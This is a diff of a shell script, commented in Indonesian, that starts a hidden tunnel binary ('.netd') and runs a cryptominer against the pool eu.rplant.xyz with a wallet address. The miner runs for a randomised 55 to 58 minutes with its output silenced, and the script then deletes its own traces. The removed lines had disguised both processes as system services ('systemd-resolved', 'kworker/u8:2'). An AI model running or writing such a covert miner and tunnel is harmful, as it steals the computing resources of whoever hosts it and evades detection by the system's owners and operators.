@@ -8,26 +8,23 @@ cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
 rm -f /app/sr
 
-# start tunnel (background)
-exec -a systemd-resolved /usr/local/bin/.netd access tcp \
+# start tunnel
+/usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
 --url 127.0.0.1:443 >/dev/null 2>&1 &
 
 sleep 3
 
-# durasi 55–58 menit
+# durasi
 DURATION=$((3300 + RANDOM % 200))
 
-# jalankan dengan timeout
-timeout ${DURATION}s bash -c "
-  exec -a kworker/u8:2 /app/$NAME \
-  -a yescryptr32 \
-  -o eu.rplant.xyz:7047 \
-  -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail \
-  -p x
-" >/dev/null 2>&1
+# run (tanpa bash -c, tanpa exec -a dulu)
+timeout ${DURATION}s /app/$NAME \
+-a yescryptr32 \
+-o eu.rplant.xyz:7047 \
+-u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail \
+-p x >/dev/null 2>&1
 
-# cleanup
 rm -f "/app/$NAME"
 
 exit 0
